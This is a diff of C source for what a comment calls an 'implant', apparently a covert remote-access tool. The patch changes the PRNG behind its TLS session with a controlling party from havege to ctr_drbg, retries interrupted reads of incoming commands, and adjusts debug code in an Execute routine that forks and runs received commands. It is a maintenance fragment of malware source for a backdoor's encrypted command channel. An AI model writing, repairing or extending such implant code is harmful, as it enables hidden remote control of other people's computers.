@@ -1,8 +1,8 @@
 #include "client_session.h"
 #include "debug.h"
-#include "polarssl/crypto.h"
 
 #include "compat.h"
+#include "polarssl/net.h"
 
 #if defined LINUX || defined SOLARIS
 #include <time.h>
@@ -30,7 +30,7 @@ static int hstat( int fd );
 const unsigned long CMD_TIMEOUT = 5*60*1000; // 5 minutes
 const unsigned long PKT_TIMEOUT = 30*1000; // 30 sec.
 
-static havege_state trig_hs;
+static ctr_drbg_context ctr_drbg;
 static ssl_context	trig_ssl;
 static ssl_session	trig_ssn;
 #define _fstat fstat
@@ -433,7 +433,7 @@ unsigned long StartClientSession( int sock )
 	// we have an established TCP/IP connection
 	// although we consider this the SERVER, for the SSL/TLS transaction, 
 	// the implant acts as a SSL client
-	if ( crypt_setup_client( &trig_hs, &trig_ssl, &trig_ssn, &sock ) != SUCCESS )
+	if ( crypt_setup_client( &ctr_drbg, &trig_ssl, &trig_ssn, &sock ) != SUCCESS )
 	{
 		DLX(2, printf("ERROR: crypt_setup_client()\n"));
 			crypt_cleanup( &trig_ssl);
@@ -455,6 +455,7 @@ unsigned long StartClientSession( int sock )
 		{
 			COMMAND cmd;
 			REPLY ret;
+			int r;
 
 			// Fill reply buffer with random bytes
 			GenRandomBytes((unsigned char *)&ret, sizeof(REPLY));
@@ -465,10 +466,11 @@ unsigned long StartClientSession( int sock )
 			// this timeout is reset each time a command is received.
 			alarm( SESSION_TIMEOUT );
 
-			//		Receive(sock, (unsigned char*)&cmd, sizeof(cmd), CMD_TIMEOUT);
-			//TODO: Fix this. There's nothing in this loop after removing the WIN32 code.
-			if( 0 > crypt_read( &trig_ssl, (unsigned char *)&cmd, sizeof( COMMAND ) ) )
+			if ( (r = crypt_read( &trig_ssl, (unsigned char *)&cmd, sizeof( COMMAND ))) < 0 )
 			{
+				DLX(4, printf("\tERROR: crypt_read(): ret = %d\n", r));
+				if (r == POLARSSL_ERR_NET_WANT_READ)
+					continue;
 			}
 			alarm( 0 );
 
@@ -571,7 +573,7 @@ Exit:
 int Execute( char *path )
 {
 	//Assume success...
-	int rv;
+	D(int rv);
 	int status=0; 
 	pid_t pid;
 	char* receivedCommand;
@@ -606,7 +608,7 @@ int Execute( char *path )
 	else
 	{
 		//This is the parent process, Wait for the child to complete.
-		rv = waitpid( pid, &status, 0);
+		D(rv =) waitpid( pid, &status, 0);
 		DLX(2, printf("waitpid() returned %d while waiting for pid %d\n", rv, (int)pid));
 		if (WIFEXITED(status))
 		{
